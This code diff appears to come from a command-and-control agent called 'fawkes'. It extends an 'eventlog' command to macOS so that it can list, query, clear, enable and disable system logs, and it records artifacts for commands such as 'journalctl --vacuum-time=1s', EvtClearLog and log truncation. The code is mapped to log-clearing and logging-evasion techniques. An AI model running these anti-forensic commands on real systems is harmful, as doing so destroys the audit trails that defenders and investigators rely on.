@@ -15,14 +15,14 @@ func isFilePath(s string) bool {
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "eventlog",
-		Description:         "Manage system event logs — list, query, clear, info, enable, disable. Windows: wevtapi.dll channels. Linux: journald units and syslog files.",
-		HelpString:          "eventlog -action <list|query|clear|info|enable|disable> [-channel <name|unit|path>] [-event_id <id>] [-filter <xpath|keyword|timewindow>] [-count <max>]",
-		Version:             2,
+		Description:         "Manage system event logs — list, query, clear, info, enable, disable. Windows: wevtapi.dll channels. Linux: journald units and syslog files. macOS: Unified Logging (os_log).",
+		HelpString:          "eventlog -action <list|query|clear|info|enable|disable> [-channel <name|unit|subsystem|path>] [-event_id <id>] [-filter <xpath|keyword|timewindow>] [-count <max>]",
+		Version:             3,
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1070.001", "T1562.002"}, // T1070.001: Clear Event Logs, T1562.002: Disable Windows Event Logging
 		SupportedUIFeatures: []string{},
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
+			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
@@ -45,7 +45,7 @@ func init() {
 				CLIName:       "channel",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:  "",
-				Description:   "Windows: channel name (Security, System). Linux: systemd unit (sshd.service) or file path (/var/log/auth.log)",
+				Description:   "Windows: channel name (Security, System). Linux: systemd unit (sshd.service) or file path (/var/log/auth.log). macOS: subsystem (com.apple.xpc) or process name (sshd)",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -73,7 +73,7 @@ func init() {
 				CLIName:       "filter",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:  "",
-				Description:   "Filter: Windows: XPath or time window. Linux: keyword or time window (e.g., '24h', '7d')",
+				Description:   "Filter: Windows: XPath or time window. Linux/macOS: keyword or time window (e.g., '24h', '7d')",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -122,23 +122,43 @@ func init() {
 			switch action {
 			case "clear":
 				if channel != "" {
-					if os == "Linux" {
+					switch os {
+					case "Linux":
 						createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("journalctl --vacuum-time=1s — journal vacuum"))
-					} else {
+					case "macOS":
+						if isFilePath(channel) {
+							createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("truncate %s — log file cleared", channel))
+						}
+					default:
 						createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("EvtClearLog(%s) — Windows Event Log cleared", channel))
 					}
 				}
 			case "query":
-				if os == "Linux" && channel != "" && !isFilePath(channel) {
-					createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("journalctl -u %s — query journal", channel))
+				if channel != "" && !isFilePath(channel) {
+					switch os {
+					case "Linux":
+						createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("journalctl -u %s — query journal", channel))
+					case "macOS":
+						createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("log show --predicate '%s' — query Unified Log", channel))
+					}
 				}
 			case "enable":
-				if channel != "" && os != "Linux" {
-					createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("EvtSetChannelConfigProperty(%s, Enabled=true)", channel))
+				if channel != "" {
+					switch os {
+					case "macOS":
+						createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("log config --mode level:debug --subsystem %s", channel))
+					case "Windows":
+						createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("EvtSetChannelConfigProperty(%s, Enabled=true)", channel))
+					}
 				}
 			case "disable":
-				if channel != "" && os != "Linux" {
-					createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("EvtSetChannelConfigProperty(%s, Enabled=false)", channel))
+				if channel != "" {
+					switch os {
+					case "macOS":
+						createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("log config --mode level:default --subsystem %s", channel))
+					case "Windows":
+						createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("EvtSetChannelConfigProperty(%s, Enabled=false)", channel))
+					}
 				}
 			}
 			return response
